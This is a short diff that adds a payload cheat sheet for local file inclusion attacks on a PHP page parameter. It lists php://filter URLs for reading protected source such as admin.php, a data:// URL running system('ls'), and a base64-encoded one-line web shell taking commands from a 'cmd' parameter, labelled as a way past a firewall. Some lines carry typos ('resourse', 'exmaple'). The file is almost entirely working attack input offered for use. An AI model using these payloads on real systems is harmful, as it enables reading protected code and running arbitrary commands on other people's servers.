@@ -1,0 +1,15 @@
+#PHP filter for access file
+http://example.com/index.php?page=php://filter/resourse=file.php
+
+#Get encoded unaccesible file
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+-------------------------------------------------------------------------------------------------------------------------
+
+#PHP data to run file
+http://exmaple.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+
+
+#Try to run through firewall
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
